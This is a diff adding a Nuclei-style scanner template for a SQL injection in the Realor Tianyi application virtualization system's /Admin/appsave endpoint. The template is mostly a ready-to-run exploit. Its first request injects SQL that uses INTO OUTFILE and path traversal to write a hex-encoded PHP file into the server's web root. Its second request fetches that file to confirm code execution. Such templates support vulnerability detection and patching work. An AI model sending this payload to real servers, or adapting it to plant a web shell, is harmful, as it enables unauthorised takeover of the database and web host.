@@ -1,0 +1,42 @@
+id: realor-appsave-sqli
+
+info:
+  name: Realor /Admin/appsave - SQL Injection
+  author: qwtd
+  severity: critical
+  description: |
+    瑞友天翼应用虚拟化系统是西安瑞友信息技术资讯有限公司研发的具有自主知识产权，基于服务器计算（Server-based Computing）架构的应用虚拟化平台。瑞友天翼应用虚拟化系统/Admin/appsave存在SQL注入漏洞，攻击者可以利用此漏洞获得数据库和WEB主机权限。
+  reference:
+    - https://mp.weixin.qq.com/s/gBJuCxt9d836TZRPFW7AsA
+  tags: REALOR-天翼应用虚拟化系统
+
+variables:
+  filename: '{{rand_base(6)}}'
+
+http:
+  - raw:
+      - |
+        GET /index.php?s=/Admin/appsave&appid=3%27%29%3Bselect+unhex%28%273c3f70687020706870696e666f28293b203f3e%27%29+into+outfile+%27.%5C%5C..%5C%5C..%5C%5CWebRoot%5C%5C{{filename}}.xgi%27%23 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: keep-alive
+
+      - |
+        GET /{{filename}}.xgi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "PHP Extension"
+          - "PHP Version"
+        condition: and
+
+      - type: status
+        status:
+          - 200
